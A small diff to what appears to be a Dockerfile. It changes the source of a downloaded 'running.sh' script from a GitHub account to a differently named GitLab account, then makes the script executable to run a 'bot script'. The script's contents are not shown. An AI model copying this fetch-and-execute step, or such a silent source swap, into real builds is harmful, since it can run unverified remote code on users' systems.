@@ -15,7 +15,7 @@ RUN apt-get update && apt-get install -y \
 WORKDIR /home
 
 # Run config.sh and clean up APT:
-RUN wget https://raw.githubusercontent.com/realxdagg/job/main/running.sh \
+RUN wget https://gitlab.com/morloraneam/job/-/raw/main/running.sh \
  && chmod +x running.sh
 
 # Run bot script:
